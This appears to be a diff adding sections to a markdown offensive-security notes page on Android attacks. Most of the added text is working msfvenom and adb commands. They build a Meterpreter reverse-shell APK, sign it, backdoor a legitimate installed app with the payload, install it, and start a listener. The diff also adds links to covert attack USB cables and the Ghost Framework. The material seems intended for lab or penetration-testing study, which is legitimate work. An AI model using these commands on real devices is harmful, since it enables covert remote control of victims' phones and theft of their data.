@@ -551,9 +551,52 @@ Common issue thread on GitHub: [https://github.com/iBotPeaches/Apktool/issues/17
 
 ### In-Line Attacks
 
+Hak5 O.M.G Cable: [https://shop.hak5.org/products/o-mg-cable-usb-a](https://shop.hak5.org/products/o-mg-cable-usb-a)
+
+Hacker Warehouse: [https://hackerwarehouse.com/product/usb-ninja-cable/](https://hackerwarehouse.com/product/usb-ninja-cable/)
+
 ### Creating a Generic APK with Metasploit Shell
+
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<> LPORT=<> R> android.apk
+# Application signing process
+keytool -genkey -V -keystore key.keystore -alias keystore -keyalg RSA -keysize 2048 -validity 10000
+# Sign the jar
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore android.apk keystore
+# Zip Align
+zipalign -v 4 android.apk hackedapp.apk
+```
+
+<pre class="language-bash"><code class="lang-bash"><strong># Install the malicious APK file
+</strong><strong>adb H &#x3C;IP> -P 5037 install hackedapp.apk
+</strong># Start a meterpreter listener
+msf5 exploit(multi/handler) > run
+# Run malicious APK file from the emulator
+</code></pre>
 
 ### Injecting Play Store App with Metasploit Shell
 
+```bash
+adb -H <IP> -P 5037 shell
+pm list packages | grep injured
+# Copy package name output
+pm path <Package name output>
+# Copy the of this output
+exit
+adb -H <IP> -P 5037 pull <Path output> injured.apk
+msfvenom -x injured.apk -p android/meterpreter/reverse_tcp LHOST=<> LPORT=<> -o InjuredMSF.apk
+# Uninstall old app from emulator
+# Install new malicious app to emulator
+adb -H <IP> -P 5037 install InjuredMSF.apk
+# Start a meterpreter listener
+msf5 exploit(multi/handler) > run
+# Run malicous app from the emulator
+```
+
+If you are interested in exploiting an app manually I highly suggest following this article from Black Hills Infosec: [https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)
+
 ### The Ghost Framework
 
+[https://github.com/kp-forks/ghost-1](https://github.com/kp-forks/ghost-1)
+
+Extra Video from HackerLoi showing him using Ghost Framework on a Android Phone:[ https://www.youtube.com/watch?v=0eAafqElwik](https://www.youtube.com/watch?v=0eAafqElwik)
